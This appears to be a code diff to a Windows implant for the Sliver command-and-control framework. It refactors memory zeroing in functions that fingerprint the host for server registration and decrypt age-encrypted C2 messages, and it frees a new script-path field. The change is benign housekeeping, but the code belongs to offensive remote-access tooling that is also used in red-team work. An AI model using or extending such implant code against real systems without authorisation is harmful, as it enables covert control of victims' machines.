@@ -58,6 +58,7 @@ VOID FreeGlobalConfig
 		FREE(pConfig->lpConfigID);
 		FREE(pConfig->lpServerMinisignPublicKey);
 		FREE(pConfig->lpPeerAgePublicKeySignature);
+		FREE(pConfig->lpScriptPath);
 		if (pConfig->hMutex != NULL) {
 			CloseHandle(pConfig->hMutex);
 		}
@@ -89,10 +90,12 @@ PBUFFER RegisterSliver
 	PBUFFER pResult = NULL;
 	DWORD cbResult = 1;
 	CHAR szOsName[] = "windows";
-
 	PPBElement pFinalElement = NULL;
 	PPBElement ElementList[17];
 
+	SecureZeroMemory(&OsVersion, sizeof(OsVersion));
+	SecureZeroMemory(&SystemInfo, sizeof(SystemInfo));
+	SecureZeroMemory(ElementList, sizeof(ElementList));
 	lpUUID = GetHostUUID();
 	if (lpUUID == NULL) {
 		goto CLEANUP;
@@ -114,14 +117,12 @@ PBUFFER RegisterSliver
 		goto CLEANUP;
 	}
 
-	SecureZeroMemory(&OsVersion, sizeof(OsVersion));
 	OsVersion.dwOSVersionInfoSize = sizeof(OsVersion);
 	if (!GetOsVersion(&OsVersion)) {
 		LOG_ERROR("GetOsVersion", GetLastError());
 		goto CLEANUP;
 	}
 
-	SecureZeroMemory(&SystemInfo, sizeof(SystemInfo));
 	GetNativeSystemInfo(&SystemInfo);
 	lpVersion = ALLOC(0x100);
 	wsprintfA(lpVersion, "%d build %d", OsVersion.dwMajorVersion, OsVersion.dwBuildNumber);
@@ -155,7 +156,6 @@ PBUFFER RegisterSliver
 	lpLocaleName = ConvertWcharToChar(wszLocale);
 	lpHostName = GetHostName();
 
-	SecureZeroMemory(ElementList, sizeof(ElementList));
 	ElementList[0] = CreateBytesElement(pConfig->szSliverName, lstrlenA(pConfig->szSliverName), 1);
 	ElementList[1] = CreateBytesElement(lpHostName, lstrlenA(lpHostName), 2);
 	ElementList[2] = CreateBytesElement(lpUUID + 1, lstrlenA(lpUUID + 1), 3);
@@ -794,6 +794,8 @@ PBUFFER AgeDecrypt
 	PBYTE pMac = NULL;
 	PBYTE pChacha20Key = NULL;
 
+	SecureZeroMemory(SharedSecret, sizeof(SharedSecret));
+	SecureZeroMemory(Chacha20Nonce, sizeof(Chacha20Nonce));
 	if (pCipherText->cbBuffer < 24) {
 		goto CLEANUP;
 	}
@@ -818,7 +820,6 @@ PBUFFER AgeDecrypt
 	}
 
 	pPublicKey = Base64Decode(pStanza->pArgs[0]);
-	SecureZeroMemory(SharedSecret, sizeof(SharedSecret));
 	ComputeX25519(SharedSecret, pX25519Identity->pSecretKey, pPublicKey->pBuffer);
 	pSalt = ALLOC(2 * X25519_KEY_SIZE);
 	memcpy(pSalt, pPublicKey->pBuffer, X25519_KEY_SIZE);
@@ -828,7 +829,6 @@ PBUFFER AgeDecrypt
 		goto CLEANUP;
 	}
 
-	SecureZeroMemory(Chacha20Nonce, sizeof(Chacha20Nonce));
 	pFileKey = Chacha20Poly1305DecryptAndVerify(pWrappingKey, Chacha20Nonce, pStanza->pBody, pStanza->cbBody, NULL, 0);
 	pMac = HeaderMAC(pStanzaList, pFileKey->pBuffer, pFileKey->cbBuffer);
 	if (pMac == NULL) {
